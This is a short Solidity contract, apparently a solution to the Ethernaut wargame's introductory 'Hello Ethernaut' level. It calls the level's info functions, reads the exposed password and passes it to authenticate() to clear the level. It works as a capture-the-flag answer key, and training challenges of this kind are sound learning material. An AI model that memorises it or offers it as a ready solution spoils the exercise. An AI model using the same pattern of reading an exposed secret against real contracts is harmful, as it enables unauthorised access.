// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IInstance {
    function info() external view returns (string memory);
    function info1() external view returns (string memory);
    function info2(string memory param) external view returns (string memory);
    function infoNum() external view returns (uint8);
    function info42() external view returns (string memory);

    // nom de la fonction du niveau 0
    function method7123949() external view returns (string memory);

    function password() external view returns (string memory);
    function authenticate(string memory passkey) external;
    function getCleared() external view returns (bool);
}

contract AttackHelloEthernaut {
    IInstance public target;

    constructor(address _target) {
        target = IInstance(_target);
    }

    function run() external {
        // appels “pour l'entraînement”
        target.info();
        target.info1();
        target.info2("hello");
        target.info42();
        target.method7123949();

        string memory pass = target.password();
        target.authenticate(pass);
    }

    function isCleared() external view returns (bool) {
        return target.getCleared();
    }

    function readPassword() external view returns (string memory) {
        return target.password();
    }
}